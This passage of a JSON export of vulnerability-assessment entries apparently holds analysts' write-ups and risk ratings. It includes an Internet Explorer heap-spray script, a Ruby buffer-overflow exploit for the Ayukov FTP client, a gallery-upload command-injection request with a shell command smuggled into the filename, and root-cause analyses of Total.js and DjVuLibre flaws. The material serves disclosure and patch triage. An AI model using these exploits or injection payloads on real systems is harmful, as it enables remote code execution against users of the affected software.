0x40000) shellcode += shellcode;\n\tvar block = shellcode.substring(0, (0x1000-6)/2);\n\n\talert(1);\n\theap_obj.gc();\n\theap_obj.debugHeap(true);\n\tfor (var i=1; i < 0x1E; i++) {\n\t\theap_obj.alloc(block);\n\t}\n\theap_obj.debugHeap(false);\n\talert(2);\n</script>\n```\n\nReliable UNICODE Pointers to the heap could be on the mapping of:\n\n```\nxpsp2res.dll re5.1.2600.5512\n\nstart    end        module name\n01a30000 01cf5000   xpsp2res   (deferred)\n\nAbout Internet Explorer 6, before update\n\n0:010> lmv m IEXPLORE\nstart    end        module name\n00400000 00419000   IEXPLORE   (deferred)\n    Image path: C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n    Image name: IEXPLORE.EXE\n    Timestamp:        Sun Apr 13 20:34:13 2008 (48025225)\n    CheckSum:         00017A61\n    ImageSize:        00019000\n    File version:     6.0.2900.5512\n    Product version:  6.0.2900.5512\n    File flags:       0 (Mask 3F)\n    File OS:          40004 NT Win32\n    File type:        1.0 App\n    File date:        00000000.00000000\n    Translations:     0409.04b0\n    CompanyName:      Microsoft Corporation\n    ProductName:      Microsoft\u00ae Windows\u00ae Operating System\n    InternalName:     iexplore\n    OriginalFilename: IEXPLORE.EXE\n    ProductVersion:   6.00.2900.5512\n    FileVersion:      6.00.2900.5512 (xpsp.080413-2105)\n    FileDescription:  Internet Explorer\n    LegalCopyright:   \u00a9 Microsoft Corporation. All rights reserved.\n```\n\nAfter update\n\n```\n0:018> lmv m IEXPLORE\nstart    end        module name\n00400000 00419000   IEXPLORE   (deferred)\n    Image path: C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n    Image name: IEXPLORE.EXE\n    Timestamp:        Sun Apr 13 20:34:13 2008 (48025225)\n    CheckSum:         00017A61\n    ImageSize:        00019000\n    File version:     6.0.2900.5512\n    Product version:  6.0.2900.5512\n    File flags:       0 (Mask 3F)\n    File OS:          40004 NT Win32\n    File type:        1.0 App\n    File date:        00000000.00000000\n    Translations:     0409.04b0\n    CompanyName:      Microsoft Corporation\n    ProductName:      Microsoft\u00ae Windows\u00ae Operating System\n    InternalName:     iexplore\n    OriginalFilename: IEXPLORE.EXE\n    ProductVersion:   6.00.2900.5512\n    FileVersion:      6.00.2900.5512 (xpsp.080413-2105)\n    FileDescription:  Internet Explorer\n    LegalCopyright:   \u00a9 Microsoft Corporation. All rights reserved.\n```\n\nAfter updates:\n\nInternet Explorer 7\n\n```\n0:014> lmv m IEFRAME\nstart    end        module name\n009c0000 00f89000   IEFRAME    (deferred)\n    Image path: C:\\WINDOWS\\system32\\IEFRAME.dll\n    Image name: IEFRAME.dll\n    Timestamp:        Tue Aug 14 03:54:09 2007 (46C10B41)\n    CheckSum:         005CA70C\n    ImageSize:        005C9000\n    File version:     7.0.5730.13\n    Product version:  7.0.5730.13\n    File flags:       8 (Mask 3F) Private\n    File OS:          40004 NT Win32\n    File type:        2.0 Dll\n    File date:        00000000.00000000\n    Translations:     0409.04b0\n    CompanyName:      Microsoft Corporation\n    ProductName:      Windows\u00ae Internet Explorer\n    InternalName:     IEFRAME.DLL\n    OriginalFilename: IEFRAME.DLL\n    ProductVersion:   7.00.5730.13\n    FileVersion:      7.00.5730.13 (longhorn(wmbla).070711-1130)\n    FileDescription:  Internet Explorer\n    LegalCopyright:   \u00a9 Microsoft Corporation. All rights reserved.\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "2b1d6f75-f7cc-4436-b007-766b64a689ac",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "466ab407-c1a6-446a-908f-59de2b1f5e85",
      "created": "2019-09-12T18:08:04.581344Z",
      "revisionDate": "2020-02-13T17:12:05.602918Z",
      "document": "* In fact, doesn't seem like the user should be authenticated at all. Looking at this request:\r\n\r\n```\r\nPOST /gallery/upload/index HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=---------------------------21456260222104\r\nContent-Length: 970\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"title\"\r\n1\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"image_add\"\r\n1\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"description\"\r\n1\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"tags\"\r\n\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n100000000\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"APC_UPLOAD_PROGRESS\"\r\n511ad0922b50f\r\n-----------------------------21456260222104\r\nContent-Di sposition: form-data; name=\"file\"; filename=\"1 & ls -la > file.txt\"\r\nContent-Type: application/octet-stream\r\n1\r\n-----------------------------21456260222104\r\nContent-Disposition: form-data; name=\"submit\"\r\nUpdate\r\n-----------------------------21456260222104--\r\n```\r\n\r\nAccording to my testing, really authentication isn't needed to reach the vulnerable code.\r\n\r\n* Vulnerability: The vulnerable resides on modules/gallery/upload/index.php, in the uploadFile() function, where\r\n$exec is called with partially user controlled data:\r\n\r\n```\r\n$command = \"mv \" . $_FILES['file']['tmp_name'] . \" $zip\";\r\n//die;\r\nexec ($command, $output = array (), $res);\r\n\r\n\r\n$command = \"chmod 777 \" . $zip;\r\nexec ($command, $output = array (), $res);\r\n\r\n$command = \"unzip -o -UU \" . $zip;\r\nexec ($command, $output = array (), $res);\r\n```\r\n\r\nThe $zip variable can be partially controlled:\r\n\r\n```\r\n$zip = \"/tmp/\" . $_FILES['file']['name'];\r\n```\r\n\r\nSince $_FILES['file']['name'] is used for injection \"/\" is a badchar, which makes exploitation (of something usefull) really difficult:\r\n\r\n1) Execution is with www-data privileges by default, not a lot of things to do.\r\n2) You are executing from modules/gallery/upload where by default, and in the recommended installation user hasn't privileges for writting. So\r\nthe provided PoC by htbridge doesn't work at all in a default installation:\r\n\r\n```\r\nContent-Di sposition: form-data; name=\"file\"; filename=\"1 & ls -la > file.txt\"\r\n```\r\n\r\nYou cannot write file.txt in modules/gallery/upload by default.\r\n\r\nMy PoC:\r\n\r\n```\r\nPOST /gallery/upload/index HTTP/1.1\r\nHost: localhost\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nProxy-Connection: keep-alive\r\nReferer: http://localhost/gallery/view/1\r\nContent-Type: multipart/form-data; boundary=---------------------------1107861128371857341391966473\r\nContent-Length: 360\r\n\r\n-----------------------------1107861128371857341391966473\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ls; <COMMAND>\"\r\nContent-Type: text/plain\r\n\r\nmsf.txt\r\n\r\n-----------------------------1107861128371857341391966473\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload File\r\n-----------------------------1107861128371857341391966473--\r\n```\r\n\r\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "5c838f72-dae8-4ff8-929e-342d025fe88e",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "572183a4-dc08-410b-b8ec-693e672dff54",
      "created": "2019-09-12T18:08:05.881568Z",
      "revisionDate": "2020-02-13T17:12:05.38284Z",
      "document": "\n\n## Details\nAyukov is an FTP client that was written by Sergey Ayukov back in 1994. Development stopped in 2011, and it is vulnerable to a stack-based buffer overflow vulnerability due to the way it handles the server input. The exploit was tested on Windows XP SP3 (English).\n\n## PoC\n\nHere's an example of how to crash the FTP client:\n\n```ruby\n  # Let the client log in\n  client.get_once\n\n  user = \"331 OK.\\r\\n\"\n  client.put(user)\n\n  client.get_once\n  pass = \"230 OK.\\r\\n\"\n  client.put(pass)\n\n  sploit = \"A\"*4116\n  sploit << [target.ret].pack('V') # JMP ESP here\n  sploit << \"\\x90\"*16\n  sploit << payload.encoded\n  sploit << \"C\" * (15000 - 4116 - 4 - 16 - payload.encoded.length)\n  sploit << \"\\r\\n\"\n\n  client.put(sploit)\n\n  client.get_once\n  pwd = \"257\\r\\n\"\n  client.put(pwd)\n  client.get_once\n```\n\n## Root Cause Analysis\n\nWhen serving the PoC against the vulnerable app, the client's command prompt shows:\n\n```\n12:28:43 331 OK.\n12:28:43 USER anonymous\n12:28:43 230 OK.\n12:28:43 Successfully logged in as 'anonymous@192.168.0.12'\n12:28:43 SYST\n12:28:43 .................. Lots of AAAAAs here .....................\n12:28:43 TYPE I\n12:28:43 257\n```\n\nThe interesting part here is that when the client sends a ```SYST``` request, the server responds\nwith a long string of data attempting to cause a crash. This would be a good starting point to\ninvestigate the root cause.\n\nWith IDA Pro, we can tell that the ```SYST``` string is at the following location:\n\n```\n.text:004096B6 ; char aSyst[]\n.text:004096B6 aSyst           db 'SYST',0             ; DATA XREF: sub_409978+B8C\u0019o\n```\n\nWhen we cross reference, we can tell this is used by the ```OpenControlConnection``` function.\nAlthough there is no symbol to identify the actual function name \"OpenControlConnection\", the\ndebugging message at the beginning of the function is a big hint:\n\n```C\nint __usercall OpenControlConnection@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)\n{\n  sub_45AF40(savedregs);\n  *(_DWORD *)&name.sa_data[10] = a2;\n  *(_DWORD *)&name.sa_data[6] = a3;\n  *(_DWORD *)&name.sa_data[2] = a1;\n  if ( !dword_477AEC )\n    sub_419B4C(1);\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      do\n      {\n        sub_403484(\"begin OpenControlConnection()\\n\", charResBuffer[4088]);\n        ...\n```\n\nAnyway, inside the OpenControlConnection function, we can see that the ```SYST``` command is\nrequested here for SendFTPRequest (no symbol of clue of the name, I just decided to name it this\nway):\n\n```\n.text:0040A504                 push    offset aSyst    ; \"SYST\"\n.text:0040A509                 lea     eax, [ebp+charResBuffer]\n.text:0040A50F                 push    eax             ; charResBuffer\n.text:0040A510                 lea     eax, [ebp+args]\n.text:0040A516                 push    eax             ; int\n.text:0040A517                 push    0               ; int\n.text:0040A519                 call    SendFTPRequest\n```\n\nInside the SendFTPRequest function, it looks like this:\n\n```C\nint SendFTPRequest(int a1, int arg_4, char *charResBuffer, char *Format, ...)\n{\n  char *v4; // ebx@0\n  int v5; // edi@0\n  int v6; // esi@0\n  char *v7; // edx@1\n  char Dst[16384]; // [esp+18h] [ebp-4000h]@2\n  char *savedregs; // [esp+4018h] [ebp+0h]@1\n  va_list va; // [esp+4030h] [ebp+18h]@1\n\n  va_start(va, Format);\n  sub_45AF40(savedregs);\n  savedregs = v4;\n  v7 = Format;\n  if ( Format )\n  {\n    v4 = Dst;\n    // This actually checks the input for the FTP command from the client.\n    // The 0x4000u indicates the string should not be longer than that, otherwise\n    // there will be a buffer overflow warning in this function.\n    snprintf1(Dst, 0x4000u, Format, va);\n    v7 = Dst;\n  }\n  return SendReceive((int)v4, v5, v6, a1, arg_4, charResBuffer, v7);\n}\n```\n\nWe were able to tell the second argument for ```SendFTPRequest``` is actually a buffer for receiving\nthe server's response, because the way it is used:\n\n```C\nresult = SendFTPRequest(0, (int)args, charResBuffer, \"SYST\");\nif ( result == -4 )\n  return result;\nif ( result )\n  goto LABEL_231;\nif ( *(_DWORD *)args == 2 )\n{\n  sub_445CEC(charResBuffer);\n  if ( strstr(charResBuffer, \"unix\") )\n  {\n    if ( strstr(charResBuffer, \"powerweb\") )\n    {\n      *(_DWORD *)dword_47B1E0 = 6;\n      goto LABEL_206;\n    }\n  }\n...\n```\n\nIn addition, this buffer is actually on the stack, and it's 4096 long:\n\n```\n-00001010 charResBuffer   db 4096 dup(?)\n```\n\nThis means that if the server responds with something longer than 4096 bytes for the ```SYST``` request,\nthe data may corrupt the stack, and cause a stack-based buffer overflow. At the end of\n```OpenControlConnection```, the ```RETN``` ends up loading the corrupt data, which may lead to\narbitrary code execution:\n\n```\n.text:0040AC39                 lea     esp, [ebp-2048h]\n.text:0040AC3F                 pop     ebx\n.text:0040AC40                 pop     esi\n.text:0040AC41                 pop     edi\n.text:0040AC42                 leave\n.text:0040AC43                 retn\n```\n\nSince whoever is using ```SendFTPRequest``` is responsible for providing the buffer of the server\nresponse, and there are 47 other cross-references, it is possible there are different ways to\ntrigger the same bug. However, since it doesn't look like there is a patch (because the product\nis no longer in active development, from the exploit developer's perspective, it is not necessary\nto look for other ways to exploit it).\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "0ab38663-26ef-4789-8833-ee22178d5c91",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27",
      "created": "2019-09-13T20:20:26.517465Z",
      "revisionDate": "2020-04-10T13:55:50.419495Z",
      "document": " ",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "pre_auth",
          "difficult_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "ec9bc43c-cbfd-4d31-ab26-cfa906f2b8d3",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "2f0f7d23-7b28-4849-b0fc-3b12ab190d21",
      "created": "2019-09-17T18:03:32.923498Z",
      "revisionDate": "2020-02-13T17:12:04.956697Z",
      "document": "This bug is interesting because it was being used in the wild to install software without user permissions: https://krebsonsecurity.com/tag/cve-2019-0797/. It had intrinsic value to attackers already. Whether you are really at risk depends on whether you like to run malicious binaries. Do you?",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "715f128c-4db5-452f-8df6-1e9936cb50ab",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "4b9d8f71-b091-422d-a6a7-784d50cccadd",
      "created": "2019-09-17T18:05:14.664902Z",
      "revisionDate": "2020-02-13T17:12:04.759533Z",
      "document": "This vulnerability had been in Metasploit Framework for some time, but requires an attacker to achieve some level of social engineering to be effective. Basically, don't import random things into Metasploit Framework!",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "364253de-70ac-4d99-85ec-9a9407412268",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "de62653a-b033-4270-a19a-9dba91cd4b79",
      "created": "2019-09-17T18:08:22.751657Z",
      "revisionDate": "2020-02-13T17:12:04.537897Z",
      "document": "This vulnerability is neat, but it's also in a library that has stopped upstream development for some number of years, and more recently Debian/Ubuntu completely expunged it from their repositories. A bigger risk is when software embeds a copy (because upstream is dead) that never gets updated, leading to zombie vulnerabilities rising up from the grave of an obsolete video decoder.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "urgent-to-patch": 3,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "816712cc-07b0-4e64-a89e-d955f6f37355",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "445f1cac-c379-466a-ab3a-36c33d2aa1f5",
      "created": "2019-09-17T18:10:03.058958Z",
      "revisionDate": "2020-04-13T07:43:44.299627Z",
      "document": "A classic vulnerability. Like small pox, you'd wish it was actually eradicated by now, but it still pops up occasionally in legacy systems.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "980489df-4a44-4921-9ac4-1a0424639c60",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "1af99322-737c-4abb-a31e-9c1e3cb001e4",
      "created": "2019-09-17T20:11:08.350139Z",
      "revisionDate": "2020-04-28T21:39:16.85862Z",
      "document": "Simply sending a malformed packet can result in RCE on a device running VxWorks, and there are reportedly no features such as ASLR, DEP, etc. enabled to mitigate the issue. Given the simplicity of successful exploitation, I'd say that this is a vulnerability to take seriously and patch.",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "227b145c-8e66-4831-9874-eed000e9091e",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "9c08938a-96e8-4b3c-97e9-3add4f7c0b10",
      "created": "2019-09-19T21:16:00.581739Z",
      "revisionDate": "2020-02-13T17:12:03.915287Z",
      "document": "# CVE-2019-15954: Total.js CMS 12 Widget Remote Code Execution\r\n\r\n## Introduction\r\n\r\nTotal.js is a Node.js Framework for building e-commerce applications, REST services, real-time apps, or apps for Internet of Things (IoT), etc. Total.js CMS is a Content Management System (application) that is part of the Total.js framework. A commercial version is also available, and can be seen used world-wide.\r\n\r\nIn Total.js CMS, a user with admin permission may be able to create a widget, and extend CMS functionalities for visitors. However, this can also be abused to upload JavaScript code that will be evaluated server side. As a result, it is possible to embed malicious JavaScript in the new widget, and gain remote code execution.\r\n\r\n## Technical Analysis\r\n\r\nIn the CVE advisory, we know that the vulnerability is associated with widget creation, so this is where we start the analysis. To do this, I looked for the keyword \"New widget\" because that is on the widget creation page, and very quickly I found the HTML page for that, as well as the JavaScript located at:\r\n\r\n* cms/themes/admin/public/forms/widgets.html\r\n* cms/schemas/widgets.js\r\n\r\nThe widgets.html file is what you actually look at when you're adding a new widget from the GUI. After filling out the fields, you would click on the \"Save\" button, which in HTML is this:\r\n\r\n```html\r\n<button name=\"submit\">@(SAVE)</button>\r\n```\r\n\r\nAnd the button function is handled by the following code:\r\n\r\n```javascript\r\nexports.submit = function(com) {\r\n  SETTER('loading', 'show');\r\n  AJAX('POST [url]api/widgets/ REPEAT', GETR('widgets.form'), function(response) {\r\n    SETTER('loading', 'hide', 1000);\r\n    if (response.success) {\r\n      SETTER('snackbar', 'success', '@(Widget has been saved successfully.)');\r\n      EXEC('widgets/refresh');\r\n      com.hide();\r\n    }\r\n  });\r\n};\r\n```\r\n\r\nThe following URI is important because it tells us the route:\r\n\r\n```javascript\r\nAJAX('POST [url]api/widgets/ REPEAT' ...\r\n```\r\n\r\nThe route map can be found in admin.js, and our code indicates we are looking at this route:\r\n\r\n```javascript\r\n// MODEL: /schema/widgets.js\r\n// ... Other routes ...\r\nROUTE('POST    #admin/api/widgets/                        *Widget --> @save');\r\n// ... Other routes...\r\n```\r\n\r\nThe JavaScript comment actually reveals which JS file is responsible for the widgets routes, so clearly we need to be looking at widgets.js. The route also indicates we should be looking at a `save` function, which links to `setSave`, which starts the saving process.\r\n\r\nDuring the saving process, it goes through a refreshing stage (in the `refresh` function). Although there is a lot going on, the most interesting line is this:\r\n\r\n```javascript\r\nvar obj = compile(item.body); // Line 309 (widgets.js)\r\n```\r\n\r\nThe `compile` function parses the source code for the new widget. Apparently, the JavaScript tag is a bit customized, for example, this isn't the standard JavaScript tag prefix, it is more specific to Total.JS:\r\n\r\n```javascript\r\nvar body = html.substring(beg, end);\r\nvar beg = body.indexOf('>') + 1;\r\nvar type = body.substring(0, beg);\r\n\r\nbody = body.substring(beg);\r\nraw = raw.replace(type + body + '</script>', '');\r\n\r\nbody = body.trim();\r\n\r\nif (type.indexOf('html') !== -1 || type.indexOf('plain') !== -1)\r\n  body_template = body;\r\nelse if (type.indexOf('total') !== -1 || type.indexOf('totaljs') !== -1)\r\n  body_total = body;\r\nelse if (type.indexOf('editor') !== -1)\r\n  body_editor = body;\r\nelse\r\n  body_script = body;\r\n```\r\n\r\nAfter parsing, the code could be stored in a few different ways. Specifically we want to watch where these are going in code:\r\n\r\n```javascript\r\n// Around line 258 in widgets.js\r\nobj.js = body_script;\r\n// ... code ...\r\nobj.editor = body_editor;\r\n// ... code ...\r\nobj.template = body_template;\r\n// ... code ...\r\nobj.total = body_total;\r\n// ... code ...\r\n```\r\n\r\nSo that's pretty much for the `compile` function, and back to the `refresh` function. Now that we have the parsed code, let's see what `refresh` is doing with the object members we're interested in watching. Well, there are some interesting ones, for example, this is what happens to `obj.total`:\r\n\r\n```javascript\r\nif (obj.total) {\r\n  var o = new WidgetInstace();\r\n  try {\r\n    (new Function('exports', obj.total))(o);\r\n  } catch (e) {\r\n    WARNING.message = 'Widget <b>{0}</b> exception: <b>{1}</b>'.format(item.name, e.message);\r\n    ADMIN.notify(WARNING);\r\n  }\r\n  obj.total = o;\r\n  rebuild = true;\r\n}\r\n```\r\n\r\nAs you can see here, if we have a JavaScript code block that starts like this:\r\n\r\n```javascript\r\n<script total>\r\n  // ... something ...\r\n</script>\r\n```\r\n\r\nThen that code goes to `obj.total`, and that gets executed as a new function. To mimic that code execution, open up the Developer's Tools in your browser, enter the following (which is basically what the code above is doing):\r\n\r\n```javascript\r\nfunction WidgetInstance() {}\r\nvar o = new WidgetInstance();\r\n(new Function('exports', 'console.log(\"Hello World!\");'))(o);\r\n```\r\n\r\nAnd you should see that `console.log` is executed (which represents the user-provided script):\r\n\r\n```\r\n> function WidgetInstance() {}\r\nvar o = new WidgetInstance();\r\n(new Function('exports', 'console.log(\"Hello World!\");'))(o);\r\n> VM33:3 Hello World!\r\n```\r\n\r\n\r\n\r\n\r\n\r\n",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "d68e8a01-1294-4344-838c-902d90ae4da2",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "1af99322-737c-4abb-a31e-9c1e3cb001e4",
      "created": "2019-09-20T16:46:51.854827Z",
      "revisionDate": "2020-04-28T21:59:38.110823Z",
      "document": "Capability problems with exploitation: an attacker needs a payload to do something other than a DoS. Shellcode for embedded OSes like this needs to be customized for each firmware version and device, which causes problems. This significantly increases the cost for an attacker to do something other than a DoS since it has to be customized to the target. High utility for an advanced actor who has the capability to develop custom payloads and a particular target in mind. Low utility for a low-skilled actor who wants to 'spray and pray'.\r\n\r\nMitigations: folks should limit opportunities by having strong malformed-packet filtering at the network level. Routers and switches should not be based on VxWorks at the edge.\r\n\r\nhttps://www.blackhat.com/presentations/bh-usa-09/LINDNER/BHUSA09-Lindner-RouterExploit-SLIDES.pdf\r\n\r\nAnother interesting issue with this vulnerability lies around getting the malformed packets from the edge of a network into the core of the target device. Each device needs independent analysis to determine the risk. An edge device would be riskier than a core, one. In this particular case, it's really surprising however that VxWorks did not just isic, which has been around for years and years to find a vulnerability like this: http://isic.sourceforge.net/\r\n\r\nNote: when validating the Urgent/11 scanner here: https://github.com/ArmisSecurity/urgent11-detector we found that it was unlikely to be effective across even a minimal security boundary of a standard router between network segments. We had a hard time testing it since the malformed packets were discarded by several commodity and not specially-configured kit.",
      "score": 3,
      "metadata": {
        "tags": [
          "difficult_to_develop"
        ],
        "attacker-value": 1,
        "exploitability": 1,
        "urgent-to-patch": 3,
        "used-successfully": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 4
      },
      "tags": [
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "4f801ab6-62ac-40ca-9567-45203dfee44f",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "9c08938a-96e8-4b3c-97e9-3add4f7c0b10",
      "created": "2019-09-24T18:46:05.637482Z",
      "revisionDate": "2020-02-13T17:12:03.386844Z",
      "document": "sdfsadf",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": []
    },
    {
      "id": "e07bd114-620e-4432-af73-53b808707727",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "1fcd3a14-757c-421d-8fd2-d0a1e947ecbe",
      "created": "2019-09-24T22:04:58.373393Z",
      "revisionDate": "2020-02-25T17:49:53.583507Z",
      "document": "As the world's most popular forum software, this is a big target, and that this vulnerability was an 0-day when it was first found is also extremely useful as an attacker. When exploited, the vulnerability allows an attacker to execute PHP code on any vBulletin server without requiring user authentication. It works with the default installation, meaning every vBulletin site was vulnerable at one point.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "4c63fbe3-093a-4450-ab38-58cb49e53cd1",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "1fcd3a14-757c-421d-8fd2-d0a1e947ecbe",
      "created": "2019-09-24T22:10:42.417207Z",
      "revisionDate": "2020-02-25T17:49:54.876502Z",
      "document": "https://seclists.org/fulldisclosure/2019/Sep/31 appears to leverage the same RCE technique used in https://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/ (this CVE).",
      "score": 4,
      "metadata": {},
      "tags": []
    },
    {
      "id": "815871f3-d755-4431-9f2d-af5204cda65e",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "5dd41e84-590e-4922-8227-1abb31df44bb",
      "created": "2019-09-27T11:20:20.521074Z",
      "revisionDate": "2020-02-21T22:32:40.55696Z",
      "document": "DNS over HTTPS is good for individual network privacy: it circumvents filters, nobody can see what you're browsing passively. If I was in a hotel or public wifi, it's definitely what I would expect my browser to use! But, it's bad for aggregate user privacy as browsers are rolling it out by default with their own DNS providers. Now Cloudflare, Google, or one of a few big resolvers see what you're browsing actively (since there are few local recursive resolvers). On the other hand, the privacy ship with respect to the big providers has probably sailed anyway.\r\n\r\nDoH provides more security guarantees than other DNS security solutions, e.g. DNSSec ensures authentication and integrity but not confidentiality. But it has similar limitations that prevent it from being usable as a system-wide resolver. Verifying certificates requires accurate time, so you have to fall back to regular DNS when setting time via NTP, for instance. There's no 'just encrypt' option with for DNS-over-HTTPS/TLS. So you have to accept sometimes it's still going to fail-open if other properties can't be met.\r\n\r\nDoH is _probably_ great for not standing out in network traffic: I can lookup domains without being noticed, and malware is beginning to use it as well, Since it's not easily distinguished in network traffic, adversaries can also avoid standing out. Wannacry was initially stopped by blackholing a domain over DNS. Identifying and sinkholing C2 domains now becomes harder. DNS has been a useful exfiltration and C2 technique for a while, since it exploits obscurity. DNS-over-HTTPS is even better, since it adds confidentiality over common infrastructure. There are some reference tools on this topic showing how this is accomplished.",
      "score": 3,
      "metadata": {
        "attacker-value": 5,
        "confidence-in-ratings": 5
      },
      "tags": []
    },
    {
      "id": "c025bf7a-556d-43ac-a789-bcb0b352d5c8",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "0c951592-cb7f-4672-8788-014f4110580e",
      "created": "2019-10-01T03:48:18.405892Z",
      "revisionDate": "2020-02-13T17:12:02.291745Z",
      "document": "# CVE-2019-15142: DjVuLibre UTF8 Out-of-Bound Read Vulnerability\r\n\r\n## Description\r\n\r\nDJVuLibre is an open source library for DjVu, a web-centric format and software platform for distributing documents and images. According to the official site, it is used by many academic, commercial, government, and non-commercial websites around the world.\r\n\r\nA vulnerability was found by researcher Hongxu Chen. An out-of-bound read is possible when parsing a DJVU file, resulting a denial-of-service condition.\r\n\r\n## Technical Details\r\n\r\nIn `DjVmDir::decode` of file DjVmDir.cpp, we have this block of code:\r\n\r\n```cpp\r\nvoid\r\nDjVmDir::decode(const GP<ByteStream> &gstr)\r\n{\r\n  // ... code ...\r\n  // Line 292\r\n      GTArray<char> strings;\r\n      char buffer[1024];\r\n      int length;\r\n      while((length=bs_str.read(buffer, 1024)))\r\n      {\r\n         int strings_size=strings.size();\r\n         strings.resize(strings_size+length-1);\r\n         memcpy((char*) strings+strings_size, buffer, length);\r\n      }\r\n      DEBUG_MSG(\"size of decompressed names block=\" << strings.size() << \"\\n\");\r\n      if (strings[strings.size()-1] != 0)\r\n        {\r\n         int strings_size=strings.size();\r\n         strings.resize(strings_size+1);\r\n         strings[strings_size] = 0;\r\n        }\r\n      \r\n         // Copy names into the files\r\n      const char * ptr=strings;\r\n      for(pos=files_list;pos;++pos)\r\n      {\r\n         GP<File> file=files_list[pos];\r\n\r\n         file->id=ptr;\r\n  // ... code ...\r\n}\r\n```\r\n\r\nWe start with a custom GTArray named `strings`. It is used to store the user-provided byte stream, which we read up to 1024 bytes. While storing, the GTArray buffer gets resized before the data is copied:\r\n\r\n```cpp\r\n      GTArray<char> strings;\r\n      char buffer[1024];\r\n      int length;\r\n      while((length=bs_str.read(buffer, 1024)))\r\n      {\r\n         int strings_size=strings.size();\r\n         strings.resize(strings_size+length-1);\r\n         memcpy((char*) 